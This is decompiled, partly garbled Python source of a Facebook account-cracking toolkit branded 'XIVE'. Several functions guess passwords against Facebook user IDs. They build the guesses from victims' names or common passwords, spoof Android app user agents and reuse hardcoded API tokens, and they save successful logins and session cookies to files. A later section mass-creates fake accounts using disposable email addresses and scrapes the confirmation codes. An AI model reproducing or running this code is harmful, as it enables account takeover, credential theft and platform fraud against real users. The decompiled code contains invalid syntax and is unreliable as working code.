            'xiaomi',
            'Redmi'])) + ';FBPN/com.facebook.katana;FBDV/' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ';FBSV/' + str(random.randint(9, 12)) + ';FBOP/1;FBCA/arm64-v8a:;]'
        data = {
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
        head = {
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
        url = 'https://graph.facebook.com/auth/login'
        req = httpx.post(url, data = data, headers = head).json()
        if 'session_key' in req:
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(req['session_cookies']())
            print(f'''\r{green}[XIVE-OK] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE/-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in req['error']['message']:
            print(f'''\r{black}[XIVE-CP] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cps.append(ids)
    loop += 1
    return None
    'True'
    ln = fn
    'X-FB-Client-IP'


def filemethod2(ids, names, passlist, total_ids):
    global loop
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    for pw in passlist:
        sys.stdout.write(f'''\r\r{green}[XIVE-M2] {white}%s|{blue}{total_ids}|{green}%s ''' % (loop, len(oks)))
        sys.stdout.flush()
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        user_agentox = 'Dalvik/2.1.0 Linux; U; Android ' + str(random.randrange(5, 14)) + '; ' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ' Build/QP1A.' + str(random.randrange(111111, 999999)) + ') [FBAN/FB4A;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(2, 5)) + ',width=1080,height=' + str(random.randint(1400, 1499)) + '};FBLC/' + str(random.choice([
            'cs_CZ',
            'en_GB',
            'en_US',
            'lt_LT',
            'pl_PL',
            'id_ID',
            'ru_RU',
            'pt_PT',
            'he_IL',
            'hi_IN',
            'nl_NL',
            ' it_IT',
            'en_IN',
            'es_ES',
            'en_PK'])) + ';FBCR/' + str(random.choice([
            'Tele2You',
            'Telenor',
            'FASTWEB',
            'Banglalink',
            'Sprint',
            'Jazz',
            'Vodafone IN',
            'Vi India',
            'Tele2 LT',
            'Jio 4G',
            'EE',
            'Oi',
            'MtelBG',
            'AT&amp-T',
            'Ufone',
            'Azercell'])) + ';FBMF/Xiaomi;FBBD/' + str(random.choice([
            'Xiaomi',
            'xiaomi',
            'Redmi'])) + ';FBPN/com.facebook.katana;FBDV/' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ';FBSV/' + str(random.randint(9, 12)) + ';FBOP/1;FBCA/arm64-v8a:;]'
        data = {
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
        head = {
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
        url = 'https://graph.facebook.com/auth/login'
        req = httpx.post(url, data = data, headers = head).json()
        if 'session_key' in req:
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(req['session_cookies']())
            print(f'''\r{green}[XIVE-OK] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE/-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in req['error']['message']:
            print(f'''\r{black}[XIVE-CP] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cps.append(ids)
    loop += 1
    return None
    'True'
    ln = fn
    'X-FB-Client-IP'


def filemethod3(ids, names, passlist, total_ids):
    global loop
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    for pw in passlist:
        sys.stdout.write(f'''\r\r{green}[XIVE-M3] {white}%s|{blue}{total_ids}|{green}%s ''' % (loop, len(oks)))
        sys.stdout.flush()
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        user_agentox = 'Dalvik/2.1.0 Linux; U; Android ' + str(random.randrange(5, 14)) + '; ' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ' Build/QP1A.' + str(random.randrange(111111, 999999)) + ') [FBAN/FB4A;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(2, 5)) + ',width=1080,height=' + str(random.randint(1400, 1499)) + '};FBLC/' + str(random.choice([
            'cs_CZ',
            'en_GB',
            'en_US',
            'lt_LT',
            'pl_PL',
            'id_ID',
            'ru_RU',
            'pt_PT',
            'he_IL',
            'hi_IN',
            'nl_NL',
            ' it_IT',
            'en_IN',
            'es_ES',
            'en_PK'])) + ';FBCR/' + str(random.choice([
            'Tele2You',
            'Telenor',
            'FASTWEB',
            'Banglalink',
            'Sprint',
            'Jazz',
            'Vodafone IN',
            'Vi India',
            'Tele2 LT',
            'Jio 4G',
            'EE',
            'Oi',
            'MtelBG',
            'AT&amp-T',
            'Ufone',
            'Azercell'])) + ';FBMF/Xiaomi;FBBD/' + str(random.choice([
            'Xiaomi',
            'xiaomi',
            'Redmi'])) + ';FBPN/com.facebook.katana;FBDV/' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ';FBSV/' + str(random.randint(9, 12)) + ';FBOP/1;FBCA/arm64-v8a:;]'
        data = {
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
        head = {
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
        url = 'https://graph.facebook.com/auth/login'
        req = httpx.post(url, data = data, headers = head).json()
        if 'session_key' in req:
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(req['session_cookies']())
            print(f'''\r{green}[XIVE-OK] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE/-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in req['error']['message']:
            print(f'''\r{black}[XIVE-CP] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cps.append(ids)
    loop += 1
    return None
    'True'
    ln = fn
    'X-FB-Client-IP'


def filemethod4(ids, names, passlist, total_ids):
    global loop
    fn = names.split(' ')[0]
    ln = names.split(' ')[1]
    for pw in passlist:
        sys.stdout.write(f'''\r\r{green}[XIVE-M4] {white}%s|{blue}{total_ids}|{green}%s ''' % (loop, len(oks)))
        sys.stdout.flush()
        pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
        user_agentox = 'Dalvik/2.1.0 Linux; U; Android ' + str(random.randrange(5, 14)) + '; ' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ' Build/QP1A.' + str(random.randrange(111111, 999999)) + ') [FBAN/FB4A;FBAV/' + str(random.randint(199, 399)) + '.0.0.' + str(random.randint(1, 9)) + '.' + str(random.randint(99, 199)) + ';FBBV/' + str(random.randint(111111111, 999999999)) + ';FBDM/{density=' + str(random.randint(2, 3)) + '.' + str(random.randint(2, 5)) + ',width=1080,height=' + str(random.randint(1400, 1499)) + '};FBLC/' + str(random.choice([
            'cs_CZ',
            'en_GB',
            'en_US',
            'lt_LT',
            'pl_PL',
            'id_ID',
            'ru_RU',
            'pt_PT',
            'he_IL',
            'hi_IN',
            'nl_NL',
            ' it_IT',
            'en_IN',
            'es_ES',
            'en_PK'])) + ';FBCR/' + str(random.choice([
            'Tele2You',
            'Telenor',
            'FASTWEB',
            'Banglalink',
            'Sprint',
            'Jazz',
            'Vodafone IN',
            'Vi India',
            'Tele2 LT',
            'Jio 4G',
            'EE',
            'Oi',
            'MtelBG',
            'AT&amp-T',
            'Ufone',
            'Azercell'])) + ';FBMF/Xiaomi;FBBD/' + str(random.choice([
            'Xiaomi',
            'xiaomi',
            'Redmi'])) + ';FBPN/com.facebook.katana;FBDV/' + str(random.choice([
            'M2101K7AG',
            'M2003J15SC',
            'M2004J19C',
            'M2006C3LG',
            'M2007J20CG',
            'M2010J19CG',
            'M2011K2C',
            'M2012K11AG',
            'M2101K7BG',
            'M2101K9G',
            'M2102J20SG',
            'M2102K1G',
            'M2003J15SC',
            'MI MAX 2',
            'AT&amp-T',
            'Redmi Note 4',
            'Redmi 4X',
            'Redmi Note 8 Pro',
            'Redmi Note 5',
            'Redmi Note 8T',
            'Redmi 6A',
            'Redmi 7A',
            'MI PLAY',
            'MI 8 Lite',
            'Mi 9T',
            'Mi A2 Lite',
            ' Mi 9',
            'M2101K7AG'])) + ';FBSV/' + str(random.randint(9, 12)) + ';FBOP/1;FBCA/arm64-v8a:;]'
        data = {
            'locale': 'en_US',
            'client_country_code': 'US',
            'fb_api_req_friendly_name': 'authenticate',
            'api_key': '882a8490361da98702bf97a021ddc14d',
            'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32' }
        head = {
            'X-FB-Server-Cluster': 'True',
            'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62' }
        url = 'https://graph.facebook.com/auth/login'
        req = httpx.post(url, data = data, headers = head).json()
        if 'session_key' in req:
            coki = (lambda .0: for i in .0:
i['name'] + '=' + i['value']None)(req['session_cookies']())
            print(f'''\r{green}[XIVE-OK] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE/-COOKiE.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
            oks.append(ids)
            ';'.join
        if 'www.facebook.com' in req['error']['message']:
            print(f'''\r{black}[XIVE-CP] ''' + ids + ' | ' + pas + '\x1b[1;97m')
            open('/sdcard/XIVE/XIVE-CP.txt', 'a').write(ids + '|' + pas + '\n')
            cps.append(ids)
    loop += 1
    return None
    'True'
    ln = fn
    'X-FB-Client-IP'

import requests
import bs4
import json
import os
import sys
import uuid
import random
import datetime
import time
import re
import urllib3
import rich
import base64
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
import os
import time
import random
import json
import sys
import datetime
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool

def lin():
    print('\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

A = '\x1b[1;97m'
R = '\x1b[38;5;196m'
Y = '\x1b[1;33m'
G = '\x1b[38;5;46m'
B = '\x1b[38;5;8m'
G1 = '\x1b[38;5;48m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
X = '\x1b[1;34m'
X1 = '\x1b[38;5;14m'
X2 = '\x1b[38;5;123m'
X3 = '\x1b[38;5;122m'
X4 = '\x1b[38;5;86m'
X5 = '\x1b[38;5;121m'
S = '\x1b[1;96m'
M = '\x1b[38;5;205m'

def ua():
    rr = random.randint
    aZ = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    zA = random.choice([
        'a',
        'b',
        'c',
        'd',
        'e',
        'f',
        'g',
        'h',
        'i',
        'j',
        'k',
        'l',
        'm',
        'n',
        'o',
        'p',
        'q',
        'r',
        's',
        't',
        'u',
        'v',
        'w',
        'x',
        'y',
        'z'])
    rx = random.randrange(1, 999)
    xx = 'Mozilla/5.0 (Linux; Android 6.0.1; SC-01G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.82 Mobile Safari/537.36'
    return xx


def rn():
    user = []
    os.system('clear')
    print(logo)
    print(f'''{green}EXAMPLE   : \x1b[1;37m10000 | 20000 | 90000''')
    lin()
    limit = input(f'''{A}CHOICE    : {G}''')
    lin()
    os.system('clear')
    print(logo)
    print(f'''{G}[1] METHOD ~ (2010-2009)''')
    lin()
    ask = input(f'''{A}CHOICE    : {G}''')
    lin()
    if ask in ('1',):
        star = '10000'
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 1999999999)))
            user.append(data)
            star = '100000'
            for i in range(int(limit)):
                data = str(random.choice(range(1000000000, 1999999999)))
                user.append(data)
                MrDevilEx = ThreadPool(max_workers = 40)
                os.system('clear')
                print(logo)
                print(f'''{black}[{green}<|>{black}] {blw}IF NO RESULT \x1b[1;37m[\x1b[1;31mON\x1b[1;31m/\x1b[1;31mOFF\x1b[1;37m] \x1b[1;32mAIRPLAN MODE ''')
                lin()
                for mal in user:
                    uid = star + mal
                    MrDevilEx.submit(login, uid, limit)
                    None(None, None)
                    return None
                    if not None:
                        pass

loop = 0
oks = []

def login(uid, limit):
    global loop
    Session = requests.session()
    sys.stdout.write(f'''\r{A}[XIVE-OLD] {loop}|{blue}{limit}|{G}{len(oks)}''')
    sys.stdout.flush()
    for pw in ('123456', '1234567', '12345678', '123456789', '786786'):
        headers = {
            'x-fb-connection-bandwidth': str(random.randint(200000000, 300000000)),
            'x-fb-sim-hni': str(random.randint(20000, 40000)),
            'x-fb-net-hni': str(random.randint(20000, 40000)),
            'x-fb-connection-quality': 'EXCELLENT',
            'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
            'user-agent': ua(),
            'content-type': 'application/x-www-form-urlencoded',
            'x-fb-http-engine': 'Liger' }
        rp = Session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers = headers).json()
        if 'session_key' in rp:
            print(f'''\r\r{G}[XIVE-OK] {G}{uid} |{G} {pw}''')
            open('/sdcard/XIVE/XIVE-OLD-OK', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'www.facebook.com' in rp['error_msg']:
            print(f'''\r\r{G}[XIVE-OK] {G}{uid} |{G} {pw}''')
            open('/sdcard/XIVE/XIVE-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
        if 'Please Confirm Email' in str(rp):
            print(f'''\r\r{G}[XIVE-OK] {G}{uid} |{G} {pw}''')
            open('/sdcard/XIVE/XIVE-OLD-OK.txt', 'a').write(uid + '|' + pw + '\n')
            oks.append(uid)
    loop += 1
    return None

import os
import sys
import re
import requests
import bs4
import time
import random
import json
import string
from bs4 import BeautifulSoup
from datetime import datetime
import requests
import bs4

def convert(cok):
    __for = 'datr=' + cok['datr'] + ';' + 'sb=' + cok['sb'] + ';' + 'fr=' + cok['fr'] + ';' + 'c_user=' + cok['c_user'] + ';' + 'xs=' + cok['xs']
    return __for


def inbox(session):
    time.sleep(1)
    ses = requests.Session()
    __ = 13
    data = ses.get(f'''https://10minutemail.net/address.api.php?sessionid={session}&_={str(__)}''').json()
    if len(data['mail_list']) != 1:
        address = data['mail_list'][0]['subject']
        session = address.replace('FB-', '').replace('is your Facebook confirmation code', '')
        return session

ugen = []
for x in range(5000):
    aa = 'Mozilla/5.0 (Linux; Android'
    b = random.choice([
        '6',
        '7',
        '8',
        '9',
        '10',
        '11',
        '12'])
    c = 'K)'
    d = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    e = random.randrange(1, 999)
    f = random.choice([
        'A',
        'B',
        'C',
        'D',
        'E',
        'F',
        'G',
        'H',
        'I',
        'J',
        'K',
        'L',
        'M',
        'N',
        'O',
        'P',
        'Q',
        'R',
        'S',
        'T',
        'U',
        'V',
        'W',
        'X',
        'Y',
        'Z'])
    g = 'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h = random.randrange(73, 100)
    i = '0'
    j = random.randrange(4200, 4900)
    k = random.randrange(40, 150)
    l = 'Mobile Safari/537.36'
    uaku2 = f'''{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'''
    ugen.append(uaku2)
    
    def ua():
        rr = random.randint
        aZ = random.choice([
            'A',
            'B',
            'C',
            'D',
            'E',
            'F',
            'G',
            'H',
            'I',
            'J',
            'K',
            'L',
            'M',
            'N',
            'O',
            'P',
            'Q',
            'R',
            'S',
            'T',
            'U',
            'V',
            'W',
            'X',
            'Y',
            'Z'])
        zA = random.choice([
            'a',
            'b',
            'c',
            'd',
            'e',
            'f',
            'g',
            'h',
            'i',
            'j',
            'k',
            'l',
            'm',
            'n',
            'o',
            'p',
            'q',
            'r',
            's',
            't',
            'u',
            'v',
            'w',
            'x',
            'y',
            'z'])
        rx = random.randrange(1, 999)
        xx = 'Mozilla/5.0 (Linux; Android 4.2.2; en-ca; SAMSUNG SGH-I527M Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Version/1.0 Chrome/18.0.1025.308 Mobile Safari/535.19'
        return xx

    sys.stdout.write('\x1b]2;XIVE\x07')
    
    def clear():
        os.system('clear')
        print(logo)

    BU = '\x1b[1;34m'
    A = '\x1b[1;97m'
    R = '\x1b[38;5;196m'
    Y = '\x1b[1;33m'
    G = '\x1b[38;5;46m'
    B = '\x1b[38;5;46m'
    G1 = '\x1b[38;5;48m'
    G2 = '\x1b[38;5;47m'
    G3 = '\x1b[38;5;48m'
    G4 = '\x1b[38;5;49m'
    G5 = '\x1b[38;5;50m'
    X = '\x1b[1;34m'
    X1 = '\x1b[38;5;14m'
    X2 = '\x1b[38;5;123m'
    X3 = '\x1b[38;5;122m'
    X4 = '\x1b[38;5;86m'
    X5 = '\x1b[38;5;121m'
    S = '\x1b[1;96m'
    M = '\x1b[38;5;205m'
    boy = [
        'Abdullah Hossain',
        'Arif Rahman',
        'Asif Ahmed',
        'Bashir Chowdhury',
        'Binod Sarker',
        'Rafiq Miah',
        'Mohammad Khan',
        'Mahmud Ali',
        'Mahin Islam',
        'Masud Hossain',
        'Mustafa Uddin',
        'Mohiuddin Bhuiyan',
        'Noor Khan',
        'Nasir Ahmed',
        'Nurul Haque',
        'Rajib Siddique',
        'Rezaul Islam',
        'Riyad Rahman',
        'Sabbir Mia',
        'Sadik Chowdhury',
        'Samsuddin Mollah',
        'Selim Sarker',
        'Shahid Hossain',
        'Shafik Ahmed',
        'Shams Uddin',
        'Shahin Alam',
        'Tanveer Khan',
        'Touhid Hossain',
        'Iqbal Rahman',
        'Jafar Mia',
        'Jewel Siddique',
        'Ziaur Islam']
    girl = [
        'Ayesha Sultana',
        'Momena Begum',
        'Rokeya Sultana',
        'Fatema Anwar',
        'Sultana Kamal',
        'Jahanara Alam',
        'Ruma Akter',
        'Farzana Yasmin',
        'Salma Begum',
        'Nusrat Jahan',
        'Shaheen Akter',
        'Sabrina Sultana',
        'Purnima Roy',
        'Shirin Akter',
        'Jannatul Ferdous',
        'Mousumi Parveen',
        'Rina Begum',
        'Laila Islam',
        'Rubina Sultana',
        'Nigar Sultana',
        'Shamima Nasrin',
        'Dilruba Sultana',
        'Khatun Begum',
        'Fariha Rahman',
        'Kazi Rupa',
        'Mariam Begum',
        'Selina Akter',
        'Nabila Rahman',
        'Sadia Islam',
        'Rumana Akter',
        'Sumi Akter',
        'Hena Sultana']
    ok = []
    cp = []
    
    def manu():
        os.system('clear')
        print(logo)
        print(f'''{A}[{R}1{A}] {G}AUTO CREATE ''')
        print(f'''{A}[{R}2{A}] {G}EXIT ''')
        linex()
        sel = input(f'''{A}[{R}={A}] {G}INPUT {R}>>{A} ''')
        if sel in ('1', '01'):
            create().start()
            return None
        if sel in ('2', '02'):
            menu()
            return None
        print(f'''{A}[{R}={A}] {G}SELECT VALID OPTION''')
        time.sleep(3)
        menu()

    
    class create:
        
        def __init__(self):
            self.loop = 0
            self.gender = []

        
        def start(self):
            os.system('clear')
            print(logo)
            print(f'''{A}[{R}+{A}] {G}BOYS NAME IDS''')
            print(f'''{A}[{R}+{A}] {G}GIRLS NAME IDS''')
            linex()
            gen = input(f'''{A}[{R}+{A}] {G}INPUT {R}>>{A}''')
            linex()
            if gen in ('1', '01'):
                self.gender.append('boy')
            if gen in ('2', '02'):
                self.gender.append('girl')
            self.gender.append('boy')
            os.system('clear')
            print(logo)
            print(f'''{A}[{R}+{A}] {G}EXAMPLE {A}:{G3} 3000{A}/{G3}5000{A}/{G3}10000{A}/{G3}99999''')
            linex()
            lim = int(input(f'''{A}[{R}+{A}] {G}INPUT {R}>>{A}  '''))
            os.system('clear')
            print(logo)
            agent = random.choice(ugen)
            headers = '980'
            headers1 = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
                'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"11.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'upgrade-insecure-requests': '1',
                'user-agent': agent }
            OO = '\x1b[0;97m'
            for x in range(lim):
                (self.loop += 1).loop = 'viewport-width'
                sys.stdout.write(f'''\r\r{G}[XIVE-AUTO] {A}{self.loop}|{G}{len(ok)}''')
                sys.stdout.flush()
                if 'boy' in self.gender:
                    name = random.choice(boy).split(' ')
                    sex = '2'
                if 'girl' in self.gender:
                    name = random.choice(girl).split(' ')
                    sex = '1'
                ses = requests.Session()
                buildses = (lambda .0: for i in .0:
random.SystemRandom().choice('qwertyuiopasdfghjklzxcvbnm0987654321')None)(range(26)())
                user = ''.join
                create = ses.get(f'''https://10minutemail.net/address.api.php?new=1&sessionid={buildses}&_={int(datetime.now().timestamp() * 1000)}''').json()
                mail = {
                    'mail': create['permalink']['mail'],
                    'session': create['session_id'] }
                email = mail['mail']
                session = mail['session']
                passw = None[0] + name[1] + str(random.randint(111, 999))
                self.ses = requests.Session()
                a = self.ses.get('https://m.facebook.com/reg?_fb_noscript', headers = headers)
                loger = re.search('name="logger_id" value="(.*?)"', str(a.text)).group(1)
                ref = BeautifulSoup(a.text, 'html.parser').find('form', {
                    'action': True,
                    'id': 'mobile-reg-form',
                    'method': 'post' })
                bl = [
                    'lsd',
                    'jazoest',
                    'cpp',
                    'reg_instance',
                    'submission_request']
                bz = [
                    'reg_impression_id',
                    'ns']
                self.data = { }
                for v in ref('input'):
                    if not v.get('name') in bl:
                        pass
                    self.data.update({
                        v.get('name'): v.get('value') })
                    self.data.update({
                        'helper': '' })
                    for v in ref('input'):
                        if not v.get('name') in bz:
                            pass
                        self.data.update({
                            v.get('name'): v.get('value') })
                        ''({
                            'custom_gender': '',
                            'field_names[]': 'reg_passwd__',
                            'reg_passwd__': passw,
                            'submit': 'Sign Up',
                            'name_suggest_elig': 'false',
                            'was_shown_name_suggestions': 'false',
                            'did_use_suggested_name': 'false',
                            'use_custom_gender': '',
                            'guid': '',
                            'pre_form_step': '' })
                        gett = self.ses.post('https://m.facebook.com' + ref['action'], headers = headers1, data = self.data)
                        getts = self.ses.get('https://m.facebook.com/login/save-device/?login_source=account_creation&logger_id=' + loger + '&app_id=103', headers = headers1)
                        data1 = { }
                        data2 = { }
                        data3 = { }
                        cok = self.ses.cookies.get_dict()
                        if 'checkpoint' in getts.url:
                            cp.append(email + passw)
                dbl = [
                    'fb_dtsg',
                    'jazoest',
                    'flow',
                    'next',
                    'nux_source']
                for x in BeautifulSoup(getts.text, 'html.parser').find_all('form', {
                    'method': 'post' }):
                    if not '/login/device-based/update-nonce/' in str(x):
                        pass
                    for v in x('input'):
                        if not v.get('name') in dbl:
                            pass
                        data1.update({
                            v.get('name'): v.get('value') })
                        data1.update({
                            'submit': 'OK' })
                        po = self.ses.post('https://m.facebook.com' + x.get('action'), headers = headers1, data = data1)
                        for x in BeautifulSoup(po.text, 'html.parser').find_all('form', {
                            'method': 'post' }):
                            if not 'confirmation_event_location=cliff' in str(x):
                                pass
                            for v in x('input'):
                                if not v.get('name') in dbl:
                                    pass
                                data2.update({
                                    v.get('name'): v.get('value') })
                                code = None(inbox)
                                data2.update({
                                    'c': code,
                                    'submit': 'Confirm' })
                                rex = self.ses.post('https://m.facebook.com' + x.get('action'), headers = headers1, data = data2)
                                if 'checkpoint' in rex.url:
                                    cok = self.ses.cookies.get_dict()
                                    cp.append(email + passw)
